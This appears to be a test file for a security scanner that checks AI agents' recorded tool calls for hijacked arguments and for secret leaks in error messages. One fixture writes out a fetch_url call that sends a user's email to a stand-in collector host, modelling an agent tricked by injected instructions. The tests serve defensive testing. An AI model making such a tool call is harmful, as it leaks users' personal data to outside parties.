"""Observation-mode tool calls (--tool-calls-file) and readable config errors."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from aiasec.cli.app import app

ARGUMENT_PROBES = "tool-argument-exfil-001,tool-argument-traversal-001"
COLLECTOR = "aiasec-argexfil.test"
LEAKED = "dana@example.test"


def _run(*args: str):
    return CliRunner().invoke(app, ["run", *args])


def _calls_file(tmp_path: Path, payload: object) -> Path:
    path = tmp_path / "calls.json"
    path.write_text(json.dumps(payload), encoding="utf-8")
    return path


def test_a_hijacked_argument_in_the_file_fails_the_argument_probe(tmp_path: Path) -> None:
    calls = _calls_file(
        tmp_path,
        [{"name": "fetch_url", "arguments": {"url": f"https://{COLLECTOR}/v?owner={LEAKED}"}}],
    )
    report = tmp_path / "report.md"

    result = _run(
        "--response", "Here is the changelog.", "--tool-calls-file", str(calls),
        "--probe-id", ARGUMENT_PROBES, "--output", str(report),
    )  # fmt: skip

    assert result.exit_code == 1, result.output
    text = report.read_text(encoding="utf-8")
    assert "- Failed probes: 1" in text
    assert "| tool-argument-exfil-001 |" in text
    # The values the agent was tricked into sending never reach the report.
    assert COLLECTOR not in text and LEAKED not in text


def test_legitimate_arguments_in_the_file_pass_the_argument_probes(tmp_path: Path) -> None:
    calls = _calls_file(
        tmp_path,
        [
            {"name": "fetch_url", "arguments": {"url": "https://docs.example.test/api/changelog"}},
            {"name": "open_file", "arguments": '{"path": "docs/release-notes.md"}'},
            "list_files",
        ],
    )

    result = _run(
        "--response", "Release 2.4 adds dark mode.", "--tool-calls-file", str(calls),
        "--probe-id", ARGUMENT_PROBES, "--output", str(tmp_path / "report.md"),
    )  # fmt: skip

    assert result.exit_code == 0, result.output


def test_names_alone_cannot_vouch_for_arguments(tmp_path: Path) -> None:
    result = _run(
        "--response", "Here is the changelog.", "--tools-called", "fetch_url",
        "--probe-id", ARGUMENT_PROBES, "--output", str(tmp_path / "report.md"),
    )  # fmt: skip

    assert result.exit_code == 1
    assert "were not reported" in (tmp_path / "report.md").read_text(encoding="utf-8")


@pytest.mark.parametrize(
    ("extra", "message"),
    [
        (["--tools-called", "fetch_url"], "Use either --tools-called or --tool-calls-file"),
        (["--target", "target.json"], "cannot be combined with"),
    ],
    ids=["with-tools-called", "with-target"],
)
def test_the_file_excludes_other_sources_of_tool_calls(
    tmp_path: Path, extra: list[str], message: str
) -> None:
    calls = _calls_file(tmp_path, ["fetch_url"])
    output = tmp_path / "report.md"

    result = _run("--tool-calls-file", str(calls), *extra, "--output", str(output))

    assert result.exit_code == 2
    assert message in result.output
    assert not output.exists()


@pytest.mark.parametrize(
    "content",
    [
        "not json",
        json.dumps({"toolsCalled": ["fetch_url"]}),
        json.dumps([{"name": "", "arguments": {"token": "sk-live-SECRET"}}]),
        json.dumps(["fetch_url", ""]),
        json.dumps([{"name": "fetch_url", "arguments": ["sk-live-SECRET"]}]),
        "[" * 100_000,
    ],
    ids=[
        "not-json", "not-a-list", "empty-name", "empty-bare-name", "list-arguments", "deep-nesting"
    ],  # fmt: skip
)
def test_a_malformed_file_is_a_contract_error_that_echoes_nothing(
    tmp_path: Path, content: str
) -> None:
    calls = tmp_path / "calls.json"
    calls.write_text(content, encoding="utf-8")
    output = tmp_path / "report.md"

    result = _run("--response", "ok", "--tool-calls-file", str(calls), "--output", str(output))

    assert result.exit_code == 2
    assert "Invalid tool calls file" in result.output
    assert "sk-live-SECRET" not in result.output
    assert not output.exists()


def _target(tmp_path: Path, config: dict[str, object]) -> Path:
    path = tmp_path / "target.json"
    path.write_text(json.dumps(config), encoding="utf-8")
    return path


def test_an_invalid_target_config_names_each_field_without_pydantic_noise(tmp_path: Path) -> None:
    target = _target(
        tmp_path, {"transport": "stdio", "command": [], "timeoutSeconds": 0, "bogus": 1}
    )

    result = _run("--target", str(target), "--execute", "--output", str(tmp_path / "r.md"))

    assert result.exit_code == 2
    assert "command: command must contain at least one argument" in result.output
    assert "timeoutSeconds: Input should be greater than 0" in result.output
    assert "bogus: Extra inputs are not permitted" in result.output
    assert "errors.pydantic.dev" not in result.output
    assert "input_value" not in result.output


def test_an_invalid_header_is_reported_without_its_value(tmp_path: Path) -> None:
    target = _target(
        tmp_path,
        {
            "transport": "http",
            "url": "https://agent.example.test/chat",
            "headers": {"Authorization": "Bearer sk-live-SECRET\n"},
        },
    )

    result = _run("--target", str(target), "--execute", "--output", str(tmp_path / "r.md"))

    assert result.exit_code == 2
    assert "headers: header names and values must not be empty" in result.output
    assert "sk-live-SECRET" not in result.output


def test_mcp_tools_list_reports_an_invalid_config_the_same_way(tmp_path: Path) -> None:
    config = _target(tmp_path, {"command": "python server.py", "env": {"": "sk-live-SECRET"}})

    result = CliRunner().invoke(app, ["mcp", "tools", "list", "--config", str(config)])

    assert result.exit_code == 2
    assert "command: Input should be a valid list" in result.output
    assert "env: env keys must not be empty" in result.output
    assert "errors.pydantic.dev" not in result.output
    assert "sk-live-SECRET" not in result.output
